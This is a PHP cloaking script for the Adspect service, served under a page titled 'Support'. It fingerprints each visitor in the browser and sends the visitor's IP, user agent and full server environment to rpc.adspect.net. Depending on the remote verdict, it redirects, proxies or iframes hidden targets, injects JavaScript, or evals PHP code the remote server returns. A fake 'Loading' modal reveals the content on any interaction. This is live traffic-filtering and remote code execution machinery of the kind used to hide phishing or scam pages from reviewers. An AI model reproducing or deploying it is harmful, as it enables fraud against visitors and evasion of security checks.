<?php
ini_set('display_errors','0');
error_reporting(E_ALL);

if(!function_exists('adspect')){
    function adspect_exit($code,$message){
        http_response_code($code);
        exit($message);
    }
    
    function adspect_dig($array,$key,$default=''){
        return array_key_exists($key,$array)?$array[$key]:$default;
    }
    
    function adspect_curl($url,$options){
        $curl=curl_init();
        curl_setopt_array($curl,[
            CURLOPT_URL=>$url,
            CURLOPT_CONNECTTIMEOUT=>60,
            CURLOPT_TIMEOUT=>60,
            CURLOPT_SSL_VERIFYHOST=>0,
            CURLOPT_SSL_VERIFYPEER=>0,
        ]);
        if(!empty($options)){
            curl_setopt_array($curl,$options);
        }
        $content=curl_exec($curl);
        $errno=curl_errno($curl);
        if($errno){
            adspect_exit(500,'curl error: '.curl_strerror($errno));
        }
        $code=curl_getinfo($curl,CURLINFO_HTTP_CODE);
        $type=curl_getinfo($curl,CURLINFO_CONTENT_TYPE);
        curl_close($curl);
        return[$code,$content,$type];
    }
    
    function adspect_rpc_url($sid){
        $sid=adspect_dig($_GET,'__sid',$sid);
        $query=adspect_dig($_SERVER,'QUERY_STRING');
        return"https://rpc.adspect.net/v2/$sid?$query";
    }
    
    function adspect_client_ip($keys){
        foreach($keys as$key){
            if(isset($_SERVER[$key])){
                $ip=$_SERVER[$key];
                if(is_string($ip)){
                    switch($key){
                        case'HTTP_X_FORWARDED_FOR':
                        case'HTTP_FORWARDED_FOR':
                            if(!preg_match('{([^,\s]+)\s*$}',$ip,$m)){
                                break;
                            }
                            $ip=$m[1];
                        default:
                            if(filter_var($ip,FILTER_VALIDATE_IP)){
                                return$ip;
                            }
                            break;
                    }
                }
            }
        }
        adspect_exit(500,'Client IP address not available');
    }
    
    function adspect_rpc_headers(){
        $ip=adspect_client_ip([
            'HTTP_DO_CONNECTING_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_TRUE_CLIENT_IP',
            'HTTP_FASTLY_CLIENT_IP',
            'HTTP_X_ENVOY_EXTERNAL_ADDRESS',
            'HTTP_X_CLIENT_IP',
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_REAL_IP',
            'HTTP_REAL_IP',
            'HTTP_FORWARDED_FOR',
            'REMOTE_ADDR',
        ]);
        $ua=adspect_dig($_SERVER,'HTTP_USER_AGENT');
        return[
            'User-Agent:',
            "Adspect-IP: $ip",
            "Adspect-UA: $ua",
        ];
    }
    
    function adspect_rpc_data(){
        $data=[];
        if($_SERVER['REQUEST_METHOD']==='POST'){
            if(!isset($_POST['data'])){
                adspect_exit(500,'Missing POST data');
            }
            $data=json_decode($_POST['data'],true);
            if(!is_array($data)){
                adspect_exit(500,'Invalid POST data');
            }
            if(isset($_COOKIE['_cid'])){
                $data['cid']=$_COOKIE['_cid'];
            }
        }
        $data['server']=$_SERVER;
        return json_encode($data);
    }
    
    function adspect_rpc($sid){
        list($code,$json)=adspect_curl(adspect_rpc_url($sid),[
            CURLOPT_HTTPHEADER=>adspect_rpc_headers(),
            CURLOPT_POST=>true,
            CURLOPT_POSTFIELDS=>adspect_rpc_data(),
            CURLOPT_RETURNTRANSFER=>true,
        ]);
        if($code!==200){
            adspect_exit(500,"RPC error $code");
        }
        $data=json_decode($json,true);
        if(!isset($data['ok'],$data['js'],$data['cid'],$data['action'],$data['target'])){
            adspect_exit(500,'Invalid RPC response');
        }
        return[$data,$json];
    }
    
    function adspect_resolve_path($url){
        $url=parse_url($url);
        $path=adspect_dig($url,'path','');
        if($path===''){
            return'';
        }
        if($path[0]!=='/'){
            $path=__DIR__.'/'.$path;
        }elseif(isset($url['host'])){
            $path=adspect_dig($_SERVER,'DOCUMENT_ROOT',__DIR__).$path;
        }
        return realpath($path);
    }
    
    function adspect_spoof_request($url=''){
        $_SERVER['REQUEST_METHOD']='GET';
        $_POST=[];
        if($url!==''){
            $url=parse_url($url);
            if(isset($url['path'])){
                if(substr($url['path'],0,1)==='/'){
                    $_SERVER['REQUEST_URI']=$url['path'];
                }else{
                    $_SERVER['REQUEST_URI']=dirname($_SERVER['REQUEST_URI']).'/'.$url['path'];
                }
            }
            if(isset($url['query'])){
                parse_str($url['query'],$_GET);
                $_SERVER['QUERY_STRING']=$url['query'];
            }else{
                $_GET=[];
                $_SERVER['QUERY_STRING']='';
            }
        }
    }
    
    function adspect_try_files(){
        foreach(func_get_args()as$path){
            if(is_file($path)){
                if(!is_readable($path)){
                    adspect_exit(403,'Permission denied');
                }
                header('Content-Type: text/html');
                switch(strtolower(pathinfo($path,PATHINFO_EXTENSION))){
                    case'php':
                    case'phtml':
                    case'php5':
                    case'php4':
                    case'php3':
                        adspect_require($path);
                        exit;
                    default:
                        header('Content-Type: '.adspect_content_type($path));
                        $name=basename($path);
                        header("Content-Disposition: attachment; filename=\"$name\"");
                    case'html':
                    case'htm':
                        header('Content-Length: '.filesize($path));
                        readfile($path);
                        exit;
                }
            }
        }
    }
    
    function adspect_require(){
        require_once func_get_arg(0);
    }
    
    function adspect_content_type($path){
        if(function_exists('mime_content_type')){
            $type=mime_content_type($path);
            if(is_string($type)){
                return$type;
            }
        }
        return'application/octet-stream';
    }
    
    function adspect_serve_local($url){
        $path=adspect_resolve_path($url);
        if($path===''){
            return;
        }
        if(is_string($path)){
            adspect_spoof_request($url);
            if(is_dir($path)){
                chdir($path);
                adspect_try_files('index.php','index.html','index.htm');
            }else{
                chdir(dirname($path));
                adspect_try_files($path);
            }
        }
        adspect_exit(404,'File not found');
    }
    
    function adspect_crypt($in,$key){
        $il=strlen($in);
        $kl=strlen($key);
        $out='';
        for($i=0;$i<$il;++$i){
            $out.=chr(ord($in[$i])^ord($key[$i%$kl]));
        }
        return$out;
    }
    
    function adspect_proxy_headers($keys){
        $headers=[];
        foreach($keys as$key){
            if(array_key_exists($key,$_SERVER)){
                $header=strtr(strtolower(substr($key,5)),'_','-');
                $headers[]="$header: {$_SERVER[$key]}";
            }
        }
        return$headers;
    }
    
    function adspect_proxy($url,$param=null,$key=null){
        $url=parse_url($url);
        if(empty($url)){
            adspect_exit(500,'Invalid proxy URL');
        }
        $options=[
            CURLOPT_USERAGENT=>adspect_dig($_SERVER,'HTTP_USER_AGENT'),
            CURLOPT_FOLLOWLOCATION=>true,
            CURLOPT_RETURNTRANSFER=>true,
        ];
        extract($url);
        if(!isset($scheme)){
            $scheme='http';
        }
        if(!isset($host)){
            $host=adspect_dig($_SERVER,'HTTP_HOST','localhost');
        }
        if(isset($port)){
            $host="$host:$port";
            $options[CURLOPT_PORT]=$port;
        }
        $origin="$scheme://$host";
        if(!isset($path)){
            $path='/';
        }elseif($path[0]!=='/'){
            $path="/$path";
        }
        $url=$origin.$path;
        if(isset($query)){
            $url.="?$query";
        }
        $headers=adspect_proxy_headers(['HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_COOKIE']);
        $headers[]='Cache-Control: no-cache';
        $options[CURLOPT_HTTPHEADER]=$headers;
        list($code,$data,$type)=adspect_curl($url,$options);
        http_response_code($code);
        if(is_string($data)){
            if(isset($param,$key)&&preg_match('{^text/(?:html|css)}i',$type)){
                $base=$path;
                if($base[-1]!=='/'){
                    $base=dirname($base);
                }
                $base=rtrim($base,'/');
                $rw=function($m)use($origin,$base,$param,$key){
                    list($repl,$what,$url)=$m;
                    $url=htmlspecialchars_decode($url);
                    $url=parse_url($url);
                    if(!empty($url)){
                        extract($url);
                        if(isset($host)){
                            if(!isset($scheme)){
                                $scheme='http';
                            }
                            $host="$scheme://$host";
                            if(isset($port)){
                                $host="$host:$port";
                            }
                        }else{
                            $host=$origin;
                        }
                        if(!isset($path)){
                            $path='';
                        }
                        if(!strlen($path)||$path[0]!=='/'){
                            $path="$base/$path";
                        }
                        if(!isset($query)){
                            $query='';
                        }
                        $host=base64_encode(adspect_crypt($host,$key));
                        parse_str($query,$query);
                        $query[$param]="$path#$host";
                        $repl='?'.http_build_query($query);
                        if(isset($fragment)){
                            $repl.="#$fragment";
                        }
                        $repl=htmlspecialchars($repl);
                        if($what[-1]==='='){
                            $repl="\"$repl\"";
                        }
                        $repl=$what.$repl;
                    }
                    return$repl;
                };
                $re='{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i';
                $data=preg_replace_callback($re,$rw,$data);
            }
        }else{
            $data='';
        }
        header("Content-Type: $type");
        header('Content-Length: '.strlen($data));
        echo$data;
    }
    
    function adspect_execute(){
        eval(func_get_arg(0));
    }
    
    function adspect($sid){
        header('Cache-Control: no-store');
        if(!function_exists('curl_init')){
            adspect_exit(500,'php-curl extension is missing');
        }
        if(!function_exists('json_encode')||!function_exists('json_decode')){
            adspect_exit(500,'php-json extension is missing');
        }
        $param='_';
        $key=hex2bin(str_replace('-','',$sid));
        if($key===false){
            adspect_exit(500,'Invalid stream ID');
        }
        if(array_key_exists($param,$_GET)&&strpos($_GET[$param],'#')!==false){
            list($url,$host)=explode('#',$_GET[$param],2);
            $host=adspect_crypt(base64_decode($host),$key);
            unset($_GET[$param]);
            $query=http_build_query($_GET);
            $url="$host$url?$query";
            adspect_proxy($url,$param,$key);
            exit;
        }
        list($data,$json)=adspect_rpc($sid);
        global$_adspect;
        $_adspect=$data;
        extract($data);
        if(isset($e)){
            eval($e);
        }
        if($js){
            setcookie('_cid',$cid,time()+60);
            return$data;
        }
        switch($action){
            case'local':
                adspect_serve_local($target);
                return null;
            case'proxy':
                adspect_proxy($target,$param,$key);
                exit;
            case'fetch':
                adspect_proxy($target);
                exit;
            case'iframe':
                $target=htmlspecialchars($target);
                exit("<!DOCTYPE html>
                <html>
                <head>
                    <meta charset='utf-8'>
                    <meta name='viewport' content='width=device-width, initial-scale=1'>
                    <title>Loading...</title>
                    <style>
                        * { margin: 0; padding: 0; box-sizing: border-box; }
                        body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
                        #loaderWrapper {
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100%;
                            height: 100%;
                            background: rgba(0,0,0,0.75);
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            z-index: 99999;
                            transition: opacity 0.5s ease;
                        }
                        .loader-box {
                            background: white;
                            padding: 40px 35px;
                            border-radius: 16px;
                            text-align: center;
                            max-width: 420px;
                            width: 90%;
                            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                            animation: popIn 0.3s ease;
                        }
                        @keyframes popIn {
                            from { transform: scale(0.8); opacity: 0; }
                            to { transform: scale(1); opacity: 1; }
                        }
                        .loader-box img {
                            width: 120px;
                            height: 120px;
                            margin-bottom: 20px;
                            display: block;
                            margin-left: auto;
                            margin-right: auto;
                        }
                        .loader-box h2 {
                            color: #333;
                            font-size: 22px;
                            margin-bottom: 10px;
                            font-weight: 600;
                        }
                        .loader-box p {
                            color: #666;
                            font-size: 16px;
                            margin-bottom: 25px;
                            line-height: 1.5;
                        }
                        .btn-group {
                            display: flex;
                            gap: 12px;
                            justify-content: center;
                            flex-wrap: wrap;
                        }
                        .btn-group button {
                            padding: 12px 35px;
                            border: none;
                            border-radius: 8px;
                            font-size: 16px;
                            font-weight: 600;
                            cursor: pointer;
                            transition: all 0.3s ease;
                            min-width: 120px;
                        }
                        #cancelBtn {
                            background: #e74c3c;
                            color: white;
                        }
                        #cancelBtn:hover {
                            background: #c0392b;
                            transform: scale(1.05);
                            box-shadow: 0 4px 15px rgba(231,76,60,0.4);
                        }
                        #continueBtn {
                            background: #2ecc71;
                            color: white;
                        }
                        #continueBtn:hover {
                            background: #27ae60;
                            transform: scale(1.05);
                            box-shadow: 0 4px 15px rgba(46,204,113,0.4);
                        }
                        #mainContent {
                            display: none;
                            width: 100%;
                            height: 100vh;
                        }
                        iframe {
                            width: 100%;
                            height: 100%;
                            border: none;
                        }
                        .spinner {
                            display: inline-block;
                            width: 50px;
                            height: 50px;
                            border: 4px solid #f3f3f3;
                            border-top: 4px solid #3498db;
                            border-radius: 50%;
                            animation: spin 1s linear infinite;
                            margin-bottom: 15px;
                        }
                        @keyframes spin {
                            0% { transform: rotate(0deg); }
                            100% { transform: rotate(360deg); }
                        }
                    </style>
                </head>
                <body>
                    <div id='loaderWrapper'>
                        <div class='loader-box'>
                            <div class='spinner'></div>
                            <h2>Loading...</h2>
                            // <p>Please wait while we prepare your content</p>
                            <div class='btn-group'>
                                <button id='cancelBtn'>Cancel</button>
                                <button id='continueBtn'>Continue</button>
                            </div>
                        </div>
                    </div>
                    <div id='mainContent'>
                        <iframe src='$target'></iframe>
                    </div>
                    <script>
                        var loader = document.getElementById('loaderWrapper');
                        var mainContent = document.getElementById('mainContent');
                        var loaded = false;
                        var interacted = false;
                        var timeoutId = null;
                        
                        function showContent() {
                            if (!loaded) {
                                loaded = true;
                                loader.style.opacity = '0';
                                setTimeout(function() {
                                    loader.style.display = 'none';
                                    mainContent.style.display = 'block';
                                }, 500);
                                // Remove all event listeners
                                document.removeEventListener('mousemove', handleInteraction);
                                document.removeEventListener('click', handleInteraction);
                                document.removeEventListener('touchstart', handleInteraction);
                                document.removeEventListener('scroll', handleInteraction);
                                document.removeEventListener('keydown', handleInteraction);
                                if (timeoutId) {
                                    clearTimeout(timeoutId);
                                    timeoutId = null;
                                }
                            }
                        }
                        
                        function handleInteraction(e) {
                            if (!interacted) {
                                interacted = true;
                                showContent();
                            }
                        }
                        
                        
                        document.addEventListener('mousemove', handleInteraction);
                        
                       
                        document.addEventListener('click', handleInteraction);
                        
                        
                        document.addEventListener('touchstart', handleInteraction);
                        
                       
                        document.addEventListener('scroll', handleInteraction);
                        
                        
                        document.addEventListener('keydown', handleInteraction);
                        
                        
                        document.getElementById('continueBtn').addEventListener('click', function(e) {
                            e.stopPropagation();
                            showContent();
                        });
                        
                        
                        document.getElementById('cancelBtn').addEventListener('click', function(e) {
                            e.stopPropagation();
                            window.location.href = 'about:blank';
                        });
                        
                        
                        timeoutId = setTimeout(function() {
                            if (!interacted) {
                                showContent();
                            }
                        }, 5000);
                    </script>
                </body>
                </html>");
                case 'noop':
                    adspect_spoof_request($target);
                    return null;
                case '301':
                case '302':
                case '303':
                case '307':
                case '308':
                    header("Location: $target", true, (int)$action);
                    exit;
                case 'refresh':
                    header("Refresh: 0; url=$target");
                    adspect_spoof_request();
                    return null;
                case 'meta':
                    $target=htmlspecialchars($target);
                    exit("<!DOCTYPE html><head><meta http-equiv='refresh' content='0; url=$target'>");
                case 'form':
                    $target=htmlspecialchars($target);
                    exit("<!DOCTYPE html><html><body><form id='form' action='$target' method='GET'></form><script>document.getElementById('form').submit();</script>");
                case 'assign':
                    $target=json_encode($target);
                    exit("<!DOCTYPE html><head><script>location.assign($target);</script>");
                case 'replace':
                    $target=json_encode($target);
                    exit("<!DOCTYPE html><head><script>location.replace($target);</script>");
                case 'top':
                    $target=json_encode($target);
                    exit("<!DOCTYPE html><head><script>top.location=$target;</script>");
                case 'return':
                    if(!is_numeric($target)){
                        adspect_exit(500,'Non-numeric status code');
                    }
                    http_response_code((int)$target);
                    exit;
                case 'php':
                    adspect_execute($target);
                    return null;
                case 'js':
                    $target=htmlspecialchars(base64_encode($target));
                    exit("<!DOCTYPE html><body><script src='data:text/javascript;base64,$target'></script>");
                case 'xar':
                    header("X-Accel-Redirect: $target");
                    exit;
                case 'xsf':
                    header("X-Sendfile: $target");
                    exit;
                default:
                    adspect_exit(500,'Unsupported action. Update integration file.');
        }
        return$data;
    }
    
    // MAIN EXECUTION - Only run if not POST request from loader
    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['load_content'])) {
        $data = adspect('40adf6f7-4c88-4d47-ac5a-606ee98ed95a');
        if(!isset($data)){
            return;
        }
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=Edge">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Support</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: Arial, sans-serif; min-height: 100vh; background: #f5f5f5; }
                #loaderWrapper {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.75);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 99999;
                    transition: opacity 0.5s ease;
                }
                .loader-box {
                    background: white;
                    padding: 40px 35px;
                    border-radius: 16px;
                    text-align: center;
                    max-width: 420px;
                    width: 90%;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    animation: popIn 0.3s ease;
                }
                @keyframes popIn {
                    from { transform: scale(0.8); opacity: 0; }
                    to { transform: scale(1); opacity: 1; }
                }
                .loader-box h2 {
                    color: #333;
                    font-size: 22px;
                    margin-bottom: 10px;
                    font-weight: 600;
                }
                .loader-box p {
                    color: #666;
                    font-size: 16px;
                    margin-bottom: 25px;
                    line-height: 1.5;
                }
                .btn-group {
                    display: flex;
                    gap: 12px;
                    justify-content: center;
                    flex-wrap: wrap;
                }
                .btn-group button {
                    padding: 12px 35px;
                    border: none;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    min-width: 120px;
                }
                #cancelBtn {
                    background: #e74c3c;
                    color: white;
                }
                #cancelBtn:hover {
                    background: #c0392b;
                    transform: scale(1.05);
                    box-shadow: 0 4px 15px rgba(231,76,60,0.4);
                }
                #continueBtn {
                    background: #2ecc71;
                    color: white;
                }
                #continueBtn:hover {
                    background: #27ae60;
                    transform: scale(1.05);
                    box-shadow: 0 4px 15px rgba(46,204,113,0.4);
                }
                #mainContent {
                    display: none;
                    width: 100%;
                    min-height: 100vh;
                }
                .spinner {
                    display: inline-block;
                    width: 50px;
                    height: 50px;
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #3498db;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin-bottom: 15px;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div id="loaderWrapper">
                <div class="loader-box">
                    <div class="spinner"></div>
                    <h2>Loading...</h2>
                    <!-- <p>Please wait while we prepare your content</p> -->
                    <div class="btn-group">
                        <button id="cancelBtn">Cancel</button>
                        <button id="continueBtn">Continue</button>
                    </div>
                </div>
            </div>
            <div id="mainContent">
                <script>
                    (function(q,u,r,e,t,v,w,x){
                        function f(a,b){try{l[a]=b()}catch(d){n[a]=d.name}}
                        function h(a,b){f(a,function(){function d(m){try{var g=b[m];switch(typeof g){case "object":null!==g&&(g=g.toString());break;case "function":g=u.prototype.toString.call(g)}c[m]=g}catch(y){n[a+"."+m]=y.name}}var c={},k;for(k in b)d(k);try{var p=q.getOwnPropertyNames(b);for(k=0;k<p.length;++k)d(p[k]);c["!!"]=p}catch(m){}return c})}
                        function z(a,b,d){var c=a.prototype[b];a.prototype[b]=function(){l.proto=!0};d();a.prototype[b]=c}
                        var n={},l={mode:"php",errors:n};
                        h("console",r);
                        h("document",e);
                        (function(a,b){f(a,function(){var d={};b=b.attributes;for(var c in b)c=b[c],d[c.nodeName]=c.nodeValue;return d})})("documentElement",e.documentElement);
                        h("location",t);
                        h("navigator",v);
                        h("window",x);
                        h("screen",w);
                        f("timezoneOffset",function(){return(new Date).getTimezoneOffset()});
                        f("closure",function(){return function(){}.toString()});
                        l.frame=!0;
                        f("frame",function(){l.frame=self!==top});
                        f("touchEvent",function(){var a=e.createEvent("TouchEvent");return{g:q.prototype.toString.call(a),t:a instanceof TouchEvent}});
                        f("tostring",function(){function a(){}var b=0;a.toString=function(){++b;return""};r.log(a);return b});
                        f("webgl",function(){var a=e.createElement("canvas").getContext("webgl"),b=a.getExtension("WEBGL_debug_renderer_info");return{vendor:a.getParameter(b.UNMASKED_VENDOR_WEBGL),renderer:a.getParameter(b.UNMASKED_RENDERER_WEBGL)}});
                        try{z(Array,"includes",function(){return e.createElement("video").canPlayType("video/mp4")})}catch(a){}
                        (function(){var a=e.createElement("form"),b=e.createElement("input");a.method="POST";a.action=t.href;b.type="hidden";b.name="data";b.value=JSON.stringify(l);a.appendChild(b);e.body.appendChild(a);a.submit()})()
                    })(Object,Function,console,document,location,navigator,screen,window);
                </script>
            </div>
            <script>
                var loader = document.getElementById('loaderWrapper');
                var mainContent = document.getElementById('mainContent');
                var loaded = false;
                var interacted = false;
                var timeoutId = null;
                
                function showContent() {
                    if (!loaded) {
                        loaded = true;
                        loader.style.opacity = '0';
                        setTimeout(function() {
                            loader.style.display = 'none';
                            mainContent.style.display = 'block';
                        }, 5000);
                        
                        document.removeEventListener('mousemove', handleInteraction);
                        document.removeEventListener('click', handleInteraction);
                        document.removeEventListener('touchstart', handleInteraction);
                        document.removeEventListener('scroll', handleInteraction);
                        document.removeEventListener('keydown', handleInteraction);
                        if (timeoutId) {
                            clearTimeout(timeoutId);
                            timeoutId = null;
                        }
                    }
                }
                
                function handleInteraction(e) {
                    if (!interacted) {
                        interacted = true;
                        showContent();
                    }
                }
                
               
                document.addEventListener('mousemove', handleInteraction);
                
                
                document.addEventListener('click', handleInteraction);
                
                
                document.addEventListener('touchstart', handleInteraction);
                
              
                document.addEventListener('scroll', handleInteraction);
                
                
                document.addEventListener('keydown', handleInteraction);
                
               
                document.getElementById('continueBtn').addEventListener('click', function(e) {
                    e.stopPropagation();
                    showContent();
                });
                
               
                document.getElementById('cancelBtn').addEventListener('click', function(e) {
                    e.stopPropagation();
                    window.location.href = 'about:blank';
                });
                
                
                timeoutId = setTimeout(function() {
                    if (!interacted) {
                        showContent();
                    }
                }, 5000);
            </script>
        </body>
        </html>
        <?php exit;
    }
}
?>